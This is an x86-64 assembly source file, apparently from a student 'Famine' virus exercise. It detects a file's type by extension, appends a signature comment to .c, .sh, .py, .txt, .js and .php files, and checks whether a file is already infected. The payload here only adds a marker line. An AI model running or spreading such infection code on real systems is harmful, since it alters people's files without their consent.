; **************************************************************************** ;
;                                                                              ;
;    handlers.asm                                         :::      ::::::::    ;
;                                                       :+:      :+:    :+:    ;
;    By: sdestann <sdestann@student.42perpignan.    +#+  +:+       +#+         ;
;                                                 +#+#+#+#+#+   +#+            ;
;    Created: 2025/10/15 08:21:18 by sdestann          #+#    #+#              ;
;    Updated: 2025/10/23 (FIXED)                                               ;
; **************************************************************************** ;

BITS 64

%include "include/macros.inc"
%include "include/structures.inc"

extern current_file
extern signature
extern sig_len

global detect_file_type
global infect_text_file
global check_text_infected

section .data
    ; Extensions supportées
    ext_c:      db ".c", 0
    ext_sh:     db ".sh", 0
    ext_py:     db ".py", 0
    ext_txt:    db ".txt", 0
    ext_js:     db ".js", 0
    ext_php:    db ".php", 0
    
    ; Signatures de commentaires par type
    comment_c:      db "/* Famine version 1.0 (c)oded by vfuster- and sdestann */", 10
    comment_c_end:
    db 0
    comment_c_len:  equ comment_c_end - comment_c
    
    comment_sh:     db "# Famine version 1.0 (c)oded by vfuster- and sdestann", 10
    comment_sh_end:
    db 0
    comment_sh_len: equ comment_sh_end - comment_sh
    
    comment_py:     db "# Famine version 1.0 (c)oded by vfuster- and sdestann", 10
    comment_py_end:
    db 0
    comment_py_len: equ comment_py_end - comment_py
    
    comment_txt:    db "# Famine version 1.0 (c)oded by vfuster- and sdestann", 10
    comment_txt_end:
    db 0
    comment_txt_len: equ comment_txt_end - comment_txt
    
    comment_js:     db "// Famine version 1.0 (c)oded by vfuster- and sdestann", 10
    comment_js_end:
    db 0
    comment_js_len: equ comment_js_end - comment_js
    
    comment_php:    db "// Famine version 1.0 (c)oded by vfuster- and sdestann", 10
    comment_php_end:
    db 0
    comment_php_len: equ comment_php_end - comment_php
    
    ; Messages de debug
    debug_filename_msg: db "[DEBUG] Nom de fichier: ", 0
    debug_filename_msg_len: equ $ - debug_filename_msg
    
    debug_ext_found_msg: db "[DEBUG] Extension trouvée: ", 0
    debug_ext_found_msg_len: equ $ - debug_ext_found_msg
    
    debug_no_extension_msg: db "[DEBUG] Aucune extension valide!", 10
    debug_no_extension_msg_len: equ $ - debug_no_extension_msg
    
    debug_testing_c_msg: db "[DEBUG] Test avec .c...", 10
    debug_testing_c_msg_len: equ $ - debug_testing_c_msg
    
    debug_testing_sh_msg: db "[DEBUG] Test avec .sh...", 10
    debug_testing_sh_msg_len: equ $ - debug_testing_sh_msg
    
    debug_testing_py_msg: db "[DEBUG] Test avec .py...", 10
    debug_testing_py_msg_len: equ $ - debug_testing_py_msg
    
    debug_testing_txt_msg: db "[DEBUG] Test avec .txt...", 10
    debug_testing_txt_msg_len: equ $ - debug_testing_txt_msg
    
    debug_testing_js_msg: db "[DEBUG] Test avec .js...", 10
    debug_testing_js_msg_len: equ $ - debug_testing_js_msg
    
    debug_testing_php_msg: db "[DEBUG] Test avec .php...", 10
    debug_testing_php_msg_len: equ $ - debug_testing_php_msg
    
    debug_type_unknown_msg: db "[DEBUG] Type inconnu", 10
    debug_type_unknown_msg_len: equ $ - debug_type_unknown_msg
    
    debug_find_dot_input_msg: db "[DEBUG] find_last_dot input: ", 0
    debug_find_dot_input_msg_len: equ $ - debug_find_dot_input_msg
    
    debug_find_dot_length_simple_msg: db "[DEBUG] Longueur calculée", 10
    debug_find_dot_length_simple_msg_len: equ $ - debug_find_dot_length_simple_msg
    
    debug_find_dot_found_msg: db "[DEBUG] Point trouvé!", 10
    debug_find_dot_found_msg_len: equ $ - debug_find_dot_found_msg
    
    debug_find_dot_not_found_msg: db "[DEBUG] Point non trouvé", 10
    debug_find_dot_not_found_msg_len: equ $ - debug_find_dot_not_found_msg
    
    debug_strcmp_simple_msg: db "[DEBUG] strcmp: comparaison en cours...", 10
    debug_strcmp_simple_msg_len: equ $ - debug_strcmp_simple_msg
    
    debug_strcmp_char_msg: db "[DEBUG] strcmp: caractères comparés", 10
    debug_strcmp_char_msg_len: equ $ - debug_strcmp_char_msg
    
    debug_strcmp_equal_msg: db "[DEBUG] strcmp: égal", 10
    debug_strcmp_equal_msg_len: equ $ - debug_strcmp_equal_msg
    
    debug_strcmp_not_equal_msg: db "[DEBUG] strcmp: différent", 10
    debug_strcmp_not_equal_msg_len: equ $ - debug_strcmp_not_equal_msg
    
    debug_infect_start_msg: db "[DEBUG] infect_text_file: début", 10
    debug_infect_start_msg_len: equ $ - debug_infect_start_msg
    
    debug_infect_lseek_msg: db "[DEBUG] infect_text_file: lseek", 10
    debug_infect_lseek_msg_len: equ $ - debug_infect_lseek_msg
    
    debug_infect_write_msg: db "[DEBUG] infect_text_file: write", 10
    debug_infect_write_msg_len: equ $ - debug_infect_write_msg
    
    debug_infect_success_msg: db "[DEBUG] infect_text_file: succès", 10
    debug_infect_success_msg_len: equ $ - debug_infect_success_msg
    
    debug_infect_error_msg: db "[DEBUG] infect_text_file: erreur", 10
    debug_infect_error_msg_len: equ $ - debug_infect_error_msg
    
    newline: db 10
    

section .text

; =============================================================================
; detect_file_type: Détecte le type de fichier basé sur l'extension
; Params: rdi = pointeur vers le nom de fichier
; Returns: rax = type (0=unknown, 1=c, 2=sh, 3=py, 4=txt, 5=js, 6=php)
; Side effects: aucun
; =============================================================================
detect_file_type:
    push rbp
    mov rbp, rsp
    push rbx
    push r12
    push r13
    
    ; DEBUG: Log du nom de fichier d'entrée
    mov r12, rdi  ; Sauvegarder le nom de fichier
    mov rdi, 1
    mov rsi, debug_filename_msg
    mov rdx, debug_filename_msg_len
    mov rax, SYS_WRITE
    syscall
    
    mov rdi, 1
    mov rsi, r12
    mov rdx, 50  ; Longueur max
    mov rax, SYS_WRITE
    syscall
    
    mov rdi, 1
    mov rsi, newline
    mov rdx, 1
    mov rax, SYS_WRITE
    syscall
    
    mov rbx, r12
    mov rdi, rbx
    call find_last_dot
    test rax, rax
    jz .unknown
    
    ; DEBUG: Log de l'extension trouvée
    mov r13, rax  ; Sauvegarder l'extension
    mov rdi, 1
    mov rsi, debug_ext_found_msg
    mov rdx, debug_ext_found_msg_len
    mov rax, SYS_WRITE
    syscall
    
    mov rdi, 1
    mov rsi, r13
    mov rdx, 10  ; Longueur max pour l'extension
    mov rax, SYS_WRITE
    syscall
    
    mov rdi, 1
    mov rsi, newline
    mov rdx, 1
    mov rax, SYS_WRITE
    syscall
    
    ; Utiliser r13 (qui contient l'extension) au lieu de rax
    mov rbx, r13                ; rbx -> extension (avec le point)
    
    ; DEBUG: Log de l'extension trouvée
    mov rdi, 1
    mov rsi, debug_ext_found_msg
    mov rdx, debug_ext_found_msg_len
    mov rax, SYS_WRITE
    syscall
    
    ; Afficher l'extension trouvée
    mov rdi, 1
    mov rsi, rbx
    mov rdx, 10  ; Longueur max pour l'extension
    mov rax, SYS_WRITE
    syscall
    
    mov rdi, 1
    mov rsi, newline
    mov rdx, 1
    mov rax, SYS_WRITE
    syscall
    
    ; DEBUG: Vérifier que rbx pointe vers quelque chose de valide
    test rbx, rbx
    jz .no_extension
    mov al, byte [rbx]
    cmp al, '.'
    je .extension_ok
.no_extension:
    mov rdi, 1
    mov rsi, debug_no_extension_msg
    mov rdx, debug_no_extension_msg_len
    mov rax, SYS_WRITE
    syscall
    jmp .unknown
.extension_ok:
    
    ; DEBUG: Test avec .c
    mov rdi, 1
    mov rsi, debug_testing_c_msg
    mov rdx, debug_testing_c_msg_len
    mov rax, SYS_WRITE
    syscall
    
    mov rdi, rbx
    mov rsi, ext_c
    call strcmp_lower
    test rax, rax
    jz .type_c
    
    ; DEBUG: Test avec .sh
    mov rdi, 1
    mov rsi, debug_testing_sh_msg
    mov rdx, debug_testing_sh_msg_len
    mov rax, SYS_WRITE
    syscall
    
    mov rdi, rbx
    mov rsi, ext_sh
    call strcmp_lower
    test rax, rax
    jz .type_sh
    
    ; DEBUG: Test avec .py
    mov rdi, 1
    mov rsi, debug_testing_py_msg
    mov rdx, debug_testing_py_msg_len
    mov rax, SYS_WRITE
    syscall
    
    mov rdi, rbx
    mov rsi, ext_py
    call strcmp_lower
    test rax, rax
    jz .type_py
    
    ; DEBUG: Test avec .txt
    mov rdi, 1
    mov rsi, debug_testing_txt_msg
    mov rdx, debug_testing_txt_msg_len
    mov rax, SYS_WRITE
    syscall
    
    mov rdi, rbx
    mov rsi, ext_txt
    call strcmp_lower
    test rax, rax
    jz .type_txt
    
    ; DEBUG: Test avec .js
    mov rdi, 1
    mov rsi, debug_testing_js_msg
    mov rdx, debug_testing_js_msg_len
    mov rax, SYS_WRITE
    syscall
    
    mov rdi, rbx
    mov rsi, ext_js
    call strcmp_lower
    test rax, rax
    jz .type_js
    
    ; DEBUG: Test avec .php
    mov rdi, 1
    mov rsi, debug_testing_php_msg
    mov rdx, debug_testing_php_msg_len
    mov rax, SYS_WRITE
    syscall
    
    mov rdi, rbx
    mov rsi, ext_php
    call strcmp_lower
    test rax, rax
    jz .type_php
    
.unknown:
    ; DEBUG: Log du type inconnu
    mov rdi, 1
    mov rsi, debug_type_unknown_msg
    mov rdx, debug_type_unknown_msg_len
    mov rax, SYS_WRITE
    syscall
    
    xor rax, rax
    jmp .done

.type_c:
    mov rax, 1
    jmp .done
.type_sh:
    mov rax, 2
    jmp .done
.type_py:
    mov rax, 3
    jmp .done
.type_txt:
    mov rax, 4
    jmp .done
.type_js:
    mov rax, 5
    jmp .done
.type_php:
    mov rax, 6
    
.done:
    ; CORRECTION: Restaurer les registres dans l'ordre inverse du push
    pop r13
    pop r12
    pop rbx
    pop rbp
    ret

; =============================================================================
; find_last_dot: Trouve le dernier point dans une chaîne
; Params: rdi = pointeur vers la chaîne
; Returns: rax = pointeur vers le dernier point (ou 0 si pas trouvé)
; Side effects: aucun
; =============================================================================
find_last_dot:
    push rbp
    mov rbp, rsp
    push rbx
    push r12
    
    mov rbx, rdi
    test rbx, rbx
    jz .not_found
    
    ; DEBUG: Log de la chaîne d'entrée
    mov rdi, 1
    mov rsi, debug_find_dot_input_msg
    mov rdx, debug_find_dot_input_msg_len
    mov rax, SYS_WRITE
    syscall
    
    mov rdi, 1
    mov rsi, rbx
    mov rdx, 50
    mov rax, SYS_WRITE
    syscall
    
    mov rdi, 1
    mov rsi, newline
    mov rdx, 1
    mov rax, SYS_WRITE
    syscall
    
    mov rdi, rbx
    call strlen
    test rax, rax
    jz .not_found
    
    ; DEBUG: Log de la longueur (simplifié)
    mov r12, rax
    mov rdi, 1
    mov rsi, debug_find_dot_length_simple_msg
    mov rdx, debug_find_dot_length_simple_msg_len
    mov rax, SYS_WRITE
    syscall
    
    ; Restaurer rdi et calculer la position du point
    mov rdi, rbx
    add rdi, r12
    sub rdi, 1
    
.loop:
    cmp rdi, rbx
    jb .not_found
    mov al, byte [rdi]
    cmp al, '.'
    je .found
    dec rdi
    jmp .loop

.found:
    ; DEBUG: Log du point trouvé
    mov r13, rdi  ; Sauvegarder rdi
    mov rdi, 1
    mov rsi, debug_find_dot_found_msg
    mov rdx, debug_find_dot_found_msg_len
    mov rax, SYS_WRITE
    syscall
    
    mov rax, r13  ; Restaurer rdi dans rax
    pop r12
    pop rbx
    pop rbp
    ret

.not_found:
    ; DEBUG: Log du point non trouvé
    mov rdi, 1
    mov rsi, debug_find_dot_not_found_msg
    mov rdx, debug_find_dot_not_found_msg_len
    mov rax, SYS_WRITE
    syscall
    
    xor rax, rax
    pop r12
    pop rbx
    pop rbp
    ret

; =============================================================================
; strcmp_lower: Compare deux chaînes en ignorant la casse
; Params: rdi = str1, rsi = str2
; Returns: rax = 0 si égales, non-zero sinon
; Side effects: aucun
; =============================================================================
strcmp_lower:
    push rbp
    mov rbp, rsp
    push rbx
    push r12
    push r13
    
    ; DEBUG: Log de la comparaison
    mov r12, rdi
    mov r13, rsi
    
    mov rdi, 1
    mov rsi, debug_strcmp_simple_msg
    mov rdx, debug_strcmp_simple_msg_len
    mov rax, SYS_WRITE
    syscall
    
    mov rdi, r12
    mov rsi, r13
    
.loop:
    ; DEBUG: Log de chaque caractère comparé
    push rdi
    push rsi
    mov rdi, 1
    mov rsi, debug_strcmp_char_msg
    mov rdx, debug_strcmp_char_msg_len
    mov rax, SYS_WRITE
    syscall
    pop rsi
    pop rdi
    
    movzx rax, byte [rdi]
    movzx rbx, byte [rsi]
    
    ; Convertir en minuscules
    ; Si 'A'-'Z', ajouter 32
    cmp al, 'A'
    jl .skip_lower1
    cmp al, 'Z'
    jg .skip_lower1
    add al, 32
.skip_lower1:
    
    cmp bl, 'A'
    jl .skip_lower2
    cmp bl, 'Z'
    jg .skip_lower2
    add bl, 32
.skip_lower2:
    
    ; Comparer
    cmp al, bl
    jne .not_equal
    
    ; Si nul, on a fini
    test al, al
    jz .equal
    
    inc rdi
    inc rsi
    jmp .loop

.equal:
    ; DEBUG: Log de l'égalité
    mov rdi, 1
    mov rsi, debug_strcmp_equal_msg
    mov rdx, debug_strcmp_equal_msg_len
    mov rax, SYS_WRITE
    syscall
    
    xor rax, rax
    pop r13
    pop r12
    pop rbx
    pop rbp
    ret

.not_equal:
    ; DEBUG: Log de la différence
    mov rdi, 1
    mov rsi, debug_strcmp_not_equal_msg
    mov rdx, debug_strcmp_not_equal_msg_len
    mov rax, SYS_WRITE
    syscall
    
    mov rax, 1
    pop r13
    pop r12
    pop rbx
    pop rbp
    ret

; =============================================================================
; strlen: Calcule la longueur d'une chaîne
; Params: rdi = pointeur vers la chaîne
; Returns: rax = longueur
; Side effects: aucun
; =============================================================================
strlen:
    push rbp
    mov rbp, rsp
    push rcx
    
    xor rcx, rcx
    
.loop:
    cmp byte [rdi + rcx], 0
    je .done
    inc rcx
    jmp .loop

.done:
    mov rax, rcx
    pop rcx
    pop rbp
    ret

; =============================================================================
; infect_text_file: Infecte un fichier texte avec un commentaire
; Params: rdi = descripteur de fichier, rax = type de fichier (1=c, 2=sh, 3=py, 4=txt, 5=js, 6=php)
; Returns: rax = 1 si succès, 0 si échec
; Side effects: modifie le fichier mappé
; =============================================================================
infect_text_file:
    push rbp
    mov rbp, rsp
    push rbx
    push r12
    push r13
    push r14
    push r15
    
    ; Sauvegarder le fd original et le type
    mov rbx, rdi  ; rbx = fd original
    mov r12, rax  ; r12 = type de fichier
    
    ; DEBUG: Log du début
    push rdi
    push rax
    mov rdi, 1
    mov rsi, debug_infect_start_msg
    mov rdx, debug_infect_start_msg_len
    mov rax, SYS_WRITE
    syscall
    pop rax
    pop rdi
    
    ; Initialiser r13 et r14 par défaut (commentaire C)
    mov r13, comment_c
    mov r14, comment_c_len
    
    ; DEBUG: Log de r12 (type)
    push rdi
    push rax
    push r12
    mov rdi, 1
    mov rsi, debug_infect_lseek_msg
    mov rdx, debug_infect_lseek_msg_len
    mov rax, SYS_WRITE
    syscall
    pop r12
    pop rax
    pop rdi
    
    ; Sélectionner la signature appropriée
    cmp r12, 1
    je .use_c_comment
    cmp r12, 2
    je .use_sh_comment
    cmp r12, 3
    je .use_py_comment
    cmp r12, 4
    je .use_txt_comment
    cmp r12, 5
    je .use_js_comment
    cmp r12, 6
    je .use_php_comment
    jmp .error

.use_c_comment:
    mov r13, comment_c
    mov r14, comment_c_len
    jmp .append_comment

.use_sh_comment:
    mov r13, comment_sh
    mov r14, comment_sh_len
    jmp .append_comment

.use_py_comment:
    mov r13, comment_py
    mov r14, comment_py_len
    jmp .append_comment

.use_txt_comment:
    mov r13, comment_txt
    mov r14, comment_txt_len
    jmp .append_comment

.use_js_comment:
    mov r13, comment_js
    mov r14, comment_js_len
    jmp .append_comment

.use_php_comment:
    mov r13, comment_php
    mov r14, comment_php_len
    jmp .append_comment

.append_comment:
    ; DEBUG: Log avant lseek
    push rdi
    push rax
    mov rdi, 1
    mov rsi, debug_infect_lseek_msg
    mov rdx, debug_infect_lseek_msg_len
    mov rax, SYS_WRITE
    syscall
    pop rax
    pop rdi
    
    ; Aller à la fin du fichier (utiliser le fd original sauvegardé)
    mov rdi, rbx  ; Utiliser le fd original
    xor rsi, rsi
    mov rdx, 2    ; SEEK_END
    mov rax, SYS_LSEEK
    syscall
    
    ; DEBUG: Log du résultat du lseek
    push rax
    mov rdi, 1
    mov rsi, debug_infect_write_msg
    mov rdx, debug_infect_write_msg_len
    push rax
    mov rax, SYS_WRITE
    syscall
    pop rax
    mov rdi, 1
    pop rax
    
    ; Vérifier l'erreur de lseek (< 0 signifie erreur)
    cmp rax, 0
    jl .error  ; Sauter si négatif
    
    ; DEBUG: Log avant write
    push rdi
    push rax
    mov rdi, 1
    mov rsi, debug_infect_write_msg
    mov rdx, debug_infect_write_msg_len
    mov rax, SYS_WRITE
    syscall
    pop rax
    pop rdi
    
    ; Écrire le commentaire à la fin
    mov rdi, rbx  ; Utiliser le fd original
    mov rsi, r13  ; Source du commentaire
    mov rdx, r14  ; Taille
    mov rax, SYS_WRITE
    syscall
    
    ; DEBUG: Log du résultat du write
    push rax
    push rdi
    mov rdi, 1
    mov rsi, debug_infect_write_msg
    mov rdx, debug_infect_write_msg_len
    push rax
    mov rax, SYS_WRITE
    syscall
    pop rax
    pop rdi
    pop rax
    
    ; Vérifier que l'écriture a réussi
    test rax, rax
    js .error  ; Si négatif, erreur
    cmp rax, r14
    jne .error  ; Si pas la bonne taille, erreur
    
    ; DEBUG: Log succès
    push rdi
    push rax
    mov rdi, 1
    mov rsi, debug_infect_success_msg
    mov rdx, debug_infect_success_msg_len
    mov rax, SYS_WRITE
    syscall
    pop rax
    pop rdi
    
    ; Mettre à jour la taille
    add [current_file + file_info.size], r14
    
    mov rax, 1
    jmp .done

.error:
    ; DEBUG: Log erreur
    push rdi
    push rax
    mov rdi, 1
    mov rsi, debug_infect_error_msg
    mov rdx, debug_infect_error_msg_len
    mov rax, SYS_WRITE
    syscall
    pop rax
    pop rdi
    
    xor rax, rax

.done:
    pop r15
    pop r14
    pop r13
    pop r12
    pop rbx
    pop rbp
    ret

; =============================================================================
; memcpy_text: Copie mémoire pour les fichiers texte
; Params: rdi = dest, rsi = src, rcx = count
; Returns: rax = dest
; Side effects: copie les données
; =============================================================================
memcpy_text:
    push rbp
    mov rbp, rsp
    push rdi
    push rsi
    push rcx
    
.loop:
    test rcx, rcx
    jz .done
    
    mov al, [rsi]
    mov [rdi], al
    
    inc rdi
    inc rsi
    dec rcx
    jmp .loop

.done:
    pop rcx
    pop rsi
    pop rdi
    mov rax, rdi
    pop rbp
    ret

; =============================================================================
; check_text_infected: Vérifie si un fichier texte est déjà infecté
; Params: rax = type de fichier
; Returns: rax = 1 si infecté, 0 sinon
; Side effects: aucun
; =============================================================================
check_text_infected:
    push rbp
    mov rbp, rsp
    sub rsp, 512  ; Buffer local pour lire le fichier
    push rbx
    push r12
    push r13
    
    ; Sélectionner la signature à chercher
    cmp rax, 1
    je .search_c_comment
    cmp rax, 2
    je .search_sh_comment
    cmp rax, 3
    je .search_py_comment
    cmp rax, 4
    je .search_txt_comment
    cmp rax, 5
    je .search_js_comment
    cmp rax, 6
    je .search_php_comment
    jmp .not_infected

.search_c_comment:
    mov rsi, comment_c
    mov rcx, comment_c_len
    jmp .search

.search_sh_comment:
    mov rsi, comment_sh
    mov rcx, comment_sh_len
    jmp .search

.search_py_comment:
    mov rsi, comment_py
    mov rcx, comment_py_len
    jmp .search

.search_txt_comment:
    mov rsi, comment_txt
    mov rcx, comment_txt_len
    jmp .search

.search_js_comment:
    mov rsi, comment_js
    mov rcx, comment_js_len
    jmp .search

.search_php_comment:
    mov rsi, comment_php
    mov rcx, comment_php_len
    jmp .search

.search:
    ; Pour les fichiers texte, lire le fichier directement
    ; Aller au début du fichier
    movsxd rdi, dword [current_file + file_info.fd]
    xor rsi, rsi
    mov rdx, 0  ; SEEK_SET
    mov rax, SYS_LSEEK
    syscall
    
    ; Lire le fichier dans un buffer temporaire
    movsxd rdi, dword [current_file + file_info.fd]
    lea rsi, [rbp - 512]  ; Buffer local sur la pile
    mov rdx, 512  ; Taille max
    mov rax, SYS_READ
    syscall
    
    ; Vérifier qu'on a lu quelque chose
    test rax, rax
    jle .not_infected
    
    ; Chercher la signature dans le buffer
    lea rdi, [rbp - 512]  ; Buffer local
    mov r12, rax  ; Taille lue
    call memstr_search
    test rax, rax
    jnz .infected

.not_infected:
    xor rax, rax
    jmp .done

.infected:
    mov rax, 1

.done:
    pop r13
    pop r12
    pop rbx
    leave
    ret

; =============================================================================
; memstr_search: Recherche une sous-chaîne dans une chaîne
; Params: rdi = haystack, r12 = haystack_len, rsi = needle, rcx = needle_len
; Returns: rax = pointeur vers la première occurrence (0 si pas trouvé)
; Side effects: aucun
; =============================================================================
memstr_search:
    push rbp
    mov rbp, rsp
    push rbx
    push r12
    push r13
    push r14
    push r15
    
    mov r13, rdi      ; haystack
    mov r14, r12      ; haystack_len
    mov r15, rsi      ; needle
    mov rbx, rcx      ; needle_len
    
    ; Vérifier que needle_len <= haystack_len
    cmp rbx, r14
    jg .not_found
    
    ; Calculer le nombre de positions à vérifier
    sub r14, rbx
    inc r14
    
    xor r12, r12      ; position dans haystack

.search_loop:
    cmp r12, r14
    jge .not_found
    
    ; Comparer needle avec haystack à la position r12
    mov rdi, r13
    add rdi, r12
    mov rsi, r15
    mov rcx, rbx
    call memcmp
    
    test rax, rax
    jz .found
    
    inc r12
    jmp .search_loop

.found:
    lea rax, [r13 + r12]
    jmp .done

.not_found:
    xor rax, rax

.done:
    pop r15
    pop r14
    pop r13
    pop r12
    pop rbx
    pop rbp
    ret

; =============================================================================
; memcmp: Compare deux zones mémoire
; Params: rdi = addr1, rsi = addr2, rcx = length
; Returns: rax = 0 si identiques, non-zero sinon
; Side effects: aucun
; =============================================================================
memcmp:
    push rbp
    mov rbp, rsp
    push rcx
    
.loop:
    test rcx, rcx
    jz .equal
    
    movzx rax, byte [rdi]
    movzx rdx, byte [rsi]
    sub rax, rdx
    jnz .done
    
    inc rdi
    inc rsi
    dec rcx
    jmp .loop

.equal:
    xor rax, rax

.done:
    pop rcx
    pop rbp
    ret